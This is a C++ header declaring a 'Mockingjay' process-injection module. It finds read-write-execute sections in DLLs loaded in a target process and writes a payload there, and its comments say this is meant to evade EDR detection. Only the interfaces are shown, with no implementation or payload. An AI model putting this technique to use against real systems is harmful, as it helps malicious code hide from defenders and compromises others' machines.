#pragma once

#include <windows.h>
#include <string>
#include <vector>

// Mockingjay Injection (2025 technique)
// 
// Instead of allocating new executable memory (which triggers EDR alerts),
// this technique finds DLLs already loaded in the target process that have
// pre-existing RWX (Read-Write-Execute) memory sections. Writing payload
// into these sections requires no VirtualAllocEx or VirtualProtectEx calls,
// making the injection completely invisible to EDRs that monitor memory
// allocation and protection changes.

namespace MockingjayInject {

struct RWXSection {
    void* address;          // Remote address of the RWX section
    size_t size;            // Size of the RWX section
    std::wstring moduleName; // Name of the DLL containing the section
};

// Find all loaded modules in the target process that contain RWX sections.
// Returns a vector of RWXSection structs, sorted by size (largest first).
std::vector<RWXSection> FindRWXSections(HANDLE hProcess);

// Inject a payload into the specified RWX section of the target process.
// The payload will be written starting at the section's base address.
// Returns true if the write succeeded.
bool InjectIntoRWX(HANDLE hProcess, const RWXSection& section,
                   const void* payload, size_t payloadSize);

} // namespace MockingjayInject
